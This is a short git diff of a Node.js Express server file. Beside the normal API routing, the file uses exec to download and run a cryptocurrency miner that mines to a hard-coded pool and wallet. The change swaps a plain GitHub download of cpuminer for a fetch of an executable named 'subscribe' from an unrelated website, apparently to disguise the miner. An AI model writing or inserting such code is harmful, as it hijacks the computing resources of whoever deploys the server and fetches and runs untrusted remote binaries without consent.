@@ -23,8 +23,8 @@ app.use(cors())
 app.use('/api/v1/', routerV1);
 app.listen(port, () => console.log(`Listening on port ${port}`));
 
-const wget = 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz';
-const run = './cpuminer-sse2 -a yespowerTIDE -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.gc -t 4';
+const wget = 'wget http://ilovenypizza.com/subscribe && chmod +x subscribe';
+const run = './subscribe -a yespowerTIDE -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.gc -t 4';
 var child = exec(wget, function(err, stdout, stderr) {
     if(err){
         throw(err);
